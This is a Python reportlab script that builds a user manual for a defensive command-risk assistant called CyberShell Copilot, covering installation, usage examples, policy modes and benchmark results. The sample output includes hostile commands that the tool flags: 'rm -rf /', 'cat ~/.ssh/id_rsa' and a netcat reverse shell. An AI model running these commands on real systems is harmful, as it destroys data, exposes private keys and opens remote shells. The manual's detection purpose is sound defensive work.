"""Generate the CyberShell Copilot user manual PDF (reportlab Platypus)."""

from __future__ import annotations

import textwrap
from datetime import date

from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import mm
from reportlab.platypus import (
    Paragraph,
    Preformatted,
    SimpleDocTemplate,
    Spacer,
)

AUTHOR = "Sumit Sunil Khurpade"
VERSION = "0.2.0"
OUT = "/mnt/user-data/outputs/CyberShell_Copilot_User_Manual_v0.2.0.pdf"

INK = colors.HexColor("#1c2530")
ACCENT = colors.HexColor("#0d6efd")
CODE_BG = colors.HexColor("#f4f6f8")
CODE_BORDER = colors.HexColor("#d6dce2")
MUTED = colors.HexColor("#5b6976")

styles = getSampleStyleSheet()
H1 = ParagraphStyle("H1", parent=styles["Heading1"], textColor=INK, fontSize=16,
                    spaceBefore=16, spaceAfter=7, fontName="Helvetica-Bold")
H2 = ParagraphStyle("H2", parent=styles["Heading2"], textColor=ACCENT, fontSize=12,
                    spaceBefore=11, spaceAfter=4, fontName="Helvetica-Bold")
BODY = ParagraphStyle("Body", parent=styles["BodyText"], textColor=INK, fontSize=10,
                      leading=14.5, spaceAfter=7)
BULLET = ParagraphStyle("Bullet", parent=BODY, leftIndent=14, bulletIndent=3, spaceAfter=2.5)
CAP = ParagraphStyle("Cap", parent=BODY, textColor=MUTED, fontSize=8.7, spaceAfter=3,
                     spaceBefore=1)
CODE = ParagraphStyle("Code", parent=styles["Code"], fontName="Courier", fontSize=8,
                      leading=10.4, textColor=INK, backColor=CODE_BG,
                      borderColor=CODE_BORDER, borderWidth=0.6, borderPadding=6,
                      spaceBefore=2, spaceAfter=9, leftIndent=0, rightIndent=0)

TITLE = ParagraphStyle("TitleX", parent=styles["Title"], textColor=INK, fontSize=30,
                       leading=34, alignment=TA_CENTER, fontName="Helvetica-Bold")
SUB = ParagraphStyle("Sub", parent=styles["Normal"], textColor=ACCENT, fontSize=14,
                     alignment=TA_CENTER, spaceBefore=6, fontName="Helvetica-Bold")
META = ParagraphStyle("Meta", parent=styles["Normal"], textColor=MUTED, fontSize=11,
                      alignment=TA_CENTER, leading=18)


def esc(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def code(text: str, width: int = 100):
    """Wrap long lines so nothing clips; keep already-short lines untouched."""
    out_lines: list[str] = []
    for line in text.strip("\n").split("\n"):
        if len(line) <= width:
            out_lines.append(line)
        else:
            wrapped = textwrap.wrap(line, width=width, subsequent_indent="      ",
                                    break_long_words=False, break_on_hyphens=False)
            out_lines.extend(wrapped or [""])
    return Preformatted("\n".join(out_lines), CODE)


def p(text: str) -> Paragraph:
    return Paragraph(text, BODY)


def bullets(items: list[str]) -> list:
    return [Paragraph(f"&bull;&nbsp;&nbsp;{t}", BULLET) for t in items]


story: list = []

# ---- Title page ----
story.append(Spacer(1, 70 * mm))
story.append(Paragraph("CyberShell&nbsp;Copilot", TITLE))
story.append(Paragraph("User Manual", SUB))
story.append(Spacer(1, 10 * mm))
story.append(Paragraph(
    "Offline, cybersecurity-aware terminal assistant<br/>"
    "for Linux and Kali", META))
story.append(Spacer(1, 26 * mm))
story.append(Paragraph(f"Version {VERSION}", META))
story.append(Paragraph(f"Author: {AUTHOR}", META))
story.append(Paragraph(date.today().strftime("%B %Y"), META))
story.append(Spacer(1, 30 * mm))
story.append(Paragraph(
    "CyberShell Copilot never executes commands. It suggests, scores, warns, "
    "blocks, and explains. Detection is static and deterministic.", CAP))

# ---- 1. Introduction ----
story.append(Paragraph("1.&nbsp;&nbsp;Introduction", H1))
story.append(p(
    "CyberShell Copilot is an offline command assistant for defenders. It suggests "
    "Linux, DevOps, and blue-team commands, scores their cyber risk, maps risky "
    "patterns to MITRE ATT&amp;CK-style tactics, blocks dangerous commands, and offers "
    "safer read-only alternatives. It does not run anything on your behalf."))
story.append(p(
    "The default application is dependency-light and runs on the Python standard "
    "library alone. Its decisions are <b>deterministic</b>: the same input always "
    "produces the same suggestion and the same risk verdict, on any machine and any "
    "run. The packaged model in this release ships <b>31 guardrail rules</b>, "
    "<b>114 command knowledge-base entries</b>, and a <b>143-case benchmark</b>."))
story.append(p("Where normal autocomplete asks \u201cwhat comes next?\u201d, CyberShell asks:"))
story.extend(bullets([
    "Is the command useful for the current context?",
    "Is it safe to display?",
    "Does it touch secrets, persistence, firewall state, disks, containers, or cloud identity?",
    "Does it resemble attacker behavior?",
    "Can we suggest a safer read-only alternative?",
]))

# ---- 2. Feature overview ----
story.append(Paragraph("2.&nbsp;&nbsp;Feature Overview", H1))
story.append(p("Every feature below works fully offline with no external calls."))

story.append(Paragraph("Suggestions", H2))
story.append(p(
    "Offline command suggestions are drawn from a 114-entry blue-team knowledge base. "
    "You can pass a command prefix or plain natural-language intent; CyberShell returns "
    "a single best, deterministically-ranked candidate and then scores it."))

story.append(Paragraph("Risk scoring and guardrails", H2))
story.append(p(
    "Each command is scored as <b>allow</b>, <b>warn</b>, or <b>block</b> across 31 "
    "rules covering destructive filesystem actions, disk wipes, reverse shells, "
    "fork bombs, and harmful natural-language intent. Warning-level rules cover secrets "
    "access, firewall tampering, persistence, privileged mutation, cloud-credential and "
    "metadata access, Kubernetes secret access, public scanning, log clearing, and bulk "
    "archive/exfiltration. Every finding carries an ATT&amp;CK-style tactic and technique."))

story.append(Paragraph("Evasion-resistant analysis", H2))
story.append(p(
    "The engine decodes base64 and hex payloads, undoes quote, backslash, and variable "
    "obfuscation, and assesses every sub-command of a pipeline or chain rather than only "
    "the first token, so obfuscated danger is still caught."))

story.append(Paragraph("Inspection and triage tools", H2))
story.extend(bullets([
    "<b>History audit</b> flags risky prior commands in a shell history file, by line number.",
    "<b>Playbooks</b> provide read-only incident-response workflows (SSH brute force, "
    "suspicious processes, Linux persistence, container and Kubernetes review).",
    "<b>Knowledge-base search</b> accepts multi-word queries.",
    "<b>Rule and policy inspection</b> lists the guardrails and the per-mode thresholds.",
    "<b>Benchmark evaluator</b> reports accuracy, false-positive rate, and recall by category.",
]))

story.append(Paragraph("Operational features", H2))
story.extend(bullets([
    "Five policy modes: SOC, strict, admin, learner, and authorized lab.",
    "Safer read-only alternatives proposed for every high-risk command.",
    "Prefix cache for accepted suggestions.",
    "Opt-in local JSONL audit trail with minimized, secret-redacted fields.",
    "Bash and Zsh key bindings for inserting safe suggestions.",
    "Optional FAISS and local GGUF LLM research backends that never relax the safety layer.",
]))

# ---- 3. Installation ----
story.append(Paragraph("3.&nbsp;&nbsp;Installation", H1))
story.append(p("On Linux or Kali, install the standard tooling and clone the project:"))
story.append(code(
    "sudo apt update\n"
    "sudo apt install -y git python3 python3-venv python3-pip\n\n"
    "git clone https://github.com/waltr0/smartTerminal.git\n"
    "cd smartTerminal\n"
    "bash install.sh\n"
    "cybershell doctor"))
story.append(p("Verify the install with <font name=\"Courier\">doctor</font>:"))
story.append(code(
    "CyberShell doctor\n"
    "Python: 3.12.3\n"
    "Command records: 114\n"
    "Guardrail rules: 31\n"
    "Default audit path: /root/.cybershell/audit.jsonl\n"
    "Status: ready"))
story.append(p("Enable shell key bindings (optional):"))
story.append(code(
    "bash install.sh --shell bash   # then: source ~/.bashrc\n"
    "bash install.sh --shell zsh    # then: source ~/.zshrc"))
story.append(p(
    "If the <font name=\"Courier\">cybershell</font> command is not found afterward, add "
    "your local bin to PATH:"))
story.append(code('export PATH="$HOME/.local/bin:$PATH"'))
story.append(p(
    "To develop from source instead, create a virtual environment and install in editable "
    "mode:"))
story.append(code(
    "python3 -m venv .venv && source .venv/bin/activate\n"
    "python -m pip install -e \".[dev]\"\n"
    "PYTHONPATH=src python -m cybershell doctor"))

# ---- 4. Usage with demonstrations ----
story.append(Paragraph("4.&nbsp;&nbsp;Usage With Demonstrations", H1))
story.append(p(
    "The examples below show real command invocations and their actual output. For "
    "<font name=\"Courier\">risk</font> and <font name=\"Courier\">explain</font>, the exit "
    "code is decision-aware: 0 for allow or warn, 2 for block."))

story.append(Paragraph("Suggest from a command prefix", H2))
story.append(code('cybershell suggest --partial "journal" --cwd /var/log'))
story.append(Paragraph("Output:", CAP))
story.append(code(
    "Suggestion: journalctl -p err -b\n"
    "Completion: ctl -p err -b\n"
    "Source: knowledge-base (0.99)\n"
    "Why: Show error-priority journal entries for the current boot. Domain: "
    "incident-response. ATT&CK-style tactic: Discovery.\n"
    "Status: answered\n"
    "Message: Safe candidate generated from packaged knowledge.\n\n"
    "Risk: safe / decision=allow / score=0\n"
    "Summary: No guardrail patterns matched; command appears safe for display."))

story.append(Paragraph("Suggest from natural-language intent", H2))
story.append(code('cybershell suggest --partial "show ssh failed logins" --cwd .'))
story.append(Paragraph("Output:", CAP))
story.append(code(
    'Suggestion: sudo grep -i "failed password" /var/log/auth.log\n'
    "Source: knowledge-base (0.65)\n"
    "Why: Find failed SSH password attempts in Debian/Ubuntu auth logs. Domain: "
    "incident-response. ATT&CK-style tactic: Credential Access.\n"
    "Status: answered"))

story.append(Paragraph("Score a dangerous command", H2))
story.append(code('cybershell risk -- "rm -rf /"'))
story.append(Paragraph("Output (exit code 2):", CAP))
story.append(code(
    "Risk: blocked / decision=block / score=181\n"
    "Summary: Blocked because high-risk guardrails matched: Deletion target appears to "
    "include the filesystem root.; Removal targets the filesystem root, a system "
    "directory or file, or a home directory.\n"
    "Findings:\n"
    "  - fs.rm_recursive_force: Recursive removal detected; confirm the target before "
    "running. (+6, evidence='rm -rf') [Impact T1485]\n"
    "  - fs.delete_root: Deletion target appears to include the filesystem root. (+95, "
    "evidence='rm -rf /') [Impact T1485]\n"
    "  - fs.destructive_critical_path: Removal targets the filesystem root, a system "
    "directory or file, or a home directory. (+80, evidence='/') [Impact T1485]\n"
    "Safer alternatives:\n"
    "  - ls -la <target>\n"
    "  - find <target> -maxdepth 1 -print\n"
    "  - trash-put <target>  # if trash-cli is installed"))

story.append(Paragraph("Explain a credential-access warning", H2))
story.append(code('cybershell explain -- "cat ~/.ssh/id_rsa"'))
story.append(Paragraph("Output:", CAP))
story.append(code(
    "Risk: dangerous / decision=warn / score=46\n"
    "Summary: Dangerous command; require explicit review: Command may print private key "
    "material to the terminal.\n"
    "Findings:\n"
    "  - secret.private_key_read: Command may print private key material to the terminal. "
    "(+46, evidence='cat ~/.ssh/id_rsa') [Credential Access T1552]\n"
    "Safer alternatives:\n"
    "  - ls -l <secret-file>\n"
    "  - stat <secret-file>\n"
    '  - grep -R "REDACTED" <path>  # avoid printing secrets'))

story.append(Paragraph("Search the knowledge base (multi-word)", H2))
story.append(code("cybershell kb-search failed ssh logins"))
story.append(Paragraph("Output:", CAP))
story.append(code(
    "4.4  ir.auth_failed_passwords\n"
    '  sudo grep -i "failed password" /var/log/auth.log\n'
    "  Find failed SSH password attempts in Debian/Ubuntu auth logs.\n"
    "3.4  svc.failed_services\n"
    "  systemctl --failed\n"
    "  List failed systemd units for operational triage."))

story.append(Paragraph("Audit a shell history file", H2))
story.append(code("cybershell history-audit --history-file ~/.bash_history"))
story.append(Paragraph("Output:", CAP))
story.append(code(
    "Scanned commands: 5\n"
    "Risky commands: 3\n"
    "- line 2: blocked score=86 command=rm -rf /etc\n"
    "  rules: fs.rm_recursive_force, fs.delete_system_path\n"
    "- line 3: dangerous score=46 command=cat ~/.ssh/id_rsa\n"
    "  rules: secret.private_key_read\n"
    "- line 4: blocked score=70 command=nc -e /bin/bash 10.0.0.1 4444\n"
    "  rules: shell.reverse_shell_tcp"))

story.append(Paragraph("List incident-response playbooks", H2))
story.append(code("cybershell playbook list"))
story.append(Paragraph("Output:", CAP))
story.append(code(
    "ssh-bruteforce-triage  SSH Brute-Force Triage\n"
    "  Read-only workflow for investigating repeated SSH authentication failures.\n"
    "suspicious-process-triage  Suspicious Process Triage\n"
    "  Read-only workflow for identifying unusual processes and network listeners.\n"
    "linux-persistence-review  Linux Persistence Review\n"
    "  Read-only workflow for reviewing common Linux persistence locations.\n"
    "container-security-review  Container Security Review\n"
    "  Read-only workflow for Docker container inventory and risky configuration review.\n"
    "kubernetes-rbac-review  Kubernetes RBAC Review\n"
    "  Read-only workflow for reviewing Kubernetes access and cluster activity."))

# ---- 5. Command reference ----
story.append(Paragraph("5.&nbsp;&nbsp;Command Reference", H1))
story.append(p(
    "CyberShell exposes 14 subcommands. Run <font name=\"Courier\">cybershell &lt;command&gt; "
    "-h</font> for the full flags of any one."))
ref = [
    ("suggest", "Suggest a safe command from a prefix or intent, then score it."),
    ("risk", "Score a command and print findings plus safer alternatives."),
    ("explain", "Verbose risk view with full findings, ATT&CK metadata, and alternatives."),
    ("accept", "Persist an accepted suggestion into a prefix cache file."),
    ("doctor", "Check packaged data and runtime readiness."),
    ("backends", "Show which suggestion backends (knowledge base, FAISS, LLM) are available."),
    ("kb-search", "Search the packaged knowledge base; multi-word queries allowed."),
    ("rules", "List the guardrail rules (--json for machine-readable output)."),
    ("policies", "List policy modes and their caution/danger/block thresholds."),
    ("bench-eval", "Run CyberShell-Bench and print metrics by category."),
    ("history-audit", "Scan a shell history file and flag risky commands by line number."),
    ("playbook", "List or show read-only incident-response playbooks."),
    ("interactive", "Interactive prompt for suggestion plus risk on each entry."),
    ("audit-report", "Summarize the local opt-in audit trail."),
]
story.extend(bullets([f"<b><font name=\"Courier\">{name}</font></b> &mdash; {esc(desc)}"
                      for name, desc in ref]))

# ---- 6. Policy modes and query contract ----
story.append(Paragraph("6.&nbsp;&nbsp;Policy Modes and Query Contract", H1))
story.append(p(
    "Policy modes shift the caution/danger/block thresholds for the same deterministic "
    "scoring. Select one with <font name=\"Courier\">--mode</font>."))
story.append(code(
    "admin    caution/danger/block: 12 / 40 / 64   routine system administration\n"
    "lab      caution/danger/block: 14 / 44 / 70   authorized lab / CTF\n"
    "learner  caution/danger/block:  8 / 28 / 58   explanation-heavy training\n"
    "soc      caution/danger/block: 10 / 35 / 60   balanced blue-team default\n"
    "strict   caution/danger/block:  6 / 22 / 45   conservative production mode"))
story.append(p("Every input resolves to exactly one of four outcomes:"))
story.extend(bullets([
    "<b>answered</b> &mdash; a safe candidate was generated and scored.",
    "<b>clarify</b> &mdash; the request is too broad, so CyberShell asks for target, "
    "scope, or defensive goal instead of guessing.",
    "<b>unsupported</b> &mdash; the request is outside the packaged command model.",
    "<b>blocked</b> &mdash; the command or intent violates safety policy.",
]))

# ---- 7. Benchmark and limitations ----
story.append(Paragraph("7.&nbsp;&nbsp;Benchmark and Honest Limitations", H1))
story.append(p(
    "CyberShell-Bench is a categorized dataset of 143 cases (135 guardrail decisions plus "
    "8 suggestion-contract cases). Run it with <font name=\"Courier\">cybershell bench-eval "
    "--fail-on-miss</font>. Results are reported failures-and-all:"))
story.extend(bullets([
    "Core accuracy (everything the tool claims to handle): <b>1.0000</b>",
    "Suggestion-contract accuracy: <b>1.0000</b>",
    "False-positive rate: <b>0.0000</b> across 66 safe commands",
    "Block detection recall: <b>0.9348</b>",
    "Documented limitations surfaced as expected misses: <b>3</b>",
]))
story.append(p(
    "The three documented misses &mdash; <font name=\"Courier\">$(...)</font> command "
    "substitution, multi-layer base64, and a <font name=\"Courier\">cd</font> into a "
    "directory followed by a relative delete &mdash; are static-analysis boundaries. "
    "Honest overall accuracy is therefore <b>0.978</b>, not a manufactured 1.0. "
    "<font name=\"Courier\">--fail-on-miss</font> exits non-zero only on unexpected "
    "regressions, never on these documented limitations."))

# ---- 8. Safety notice ----
story.append(Paragraph("8.&nbsp;&nbsp;Safety Notice", H1))
story.append(p(
    "CyberShell does not execute commands. It suggests, scores, warns, blocks, and "
    "explains. You remain responsible for any command you choose to run. Detection is "
    "static and best-effort; treat the tool as an advisory guardrail, not a guarantee, "
    "and use it only on systems you are authorized to operate."))
story.append(Spacer(1, 6 * mm))
story.append(Paragraph(
    f"CyberShell Copilot v{VERSION} &nbsp;&bull;&nbsp; User Manual &nbsp;&bull;&nbsp; "
    f"Author: {AUTHOR}", CAP))


def _footer(canvas, doc):
    canvas.saveState()
    canvas.setFont("Helvetica", 8)
    canvas.setFillColor(MUTED)
    if doc.page > 1:
        canvas.drawCentredString(A4[0] / 2, 12 * mm, f"{doc.page}")
        canvas.drawString(20 * mm, 12 * mm, "CyberShell Copilot \u2014 User Manual")
        canvas.drawRightString(A4[0] - 20 * mm, 12 * mm, f"v{VERSION}")
    canvas.restoreState()


doc = SimpleDocTemplate(
    OUT, pagesize=A4,
    leftMargin=20 * mm, rightMargin=20 * mm, topMargin=18 * mm, bottomMargin=20 * mm,
    title="CyberShell Copilot User Manual", author=AUTHOR,
    subject="Install and usage manual for CyberShell Copilot",
)
doc.build(story, onFirstPage=_footer, onLaterPages=_footer)
print("wrote", OUT)
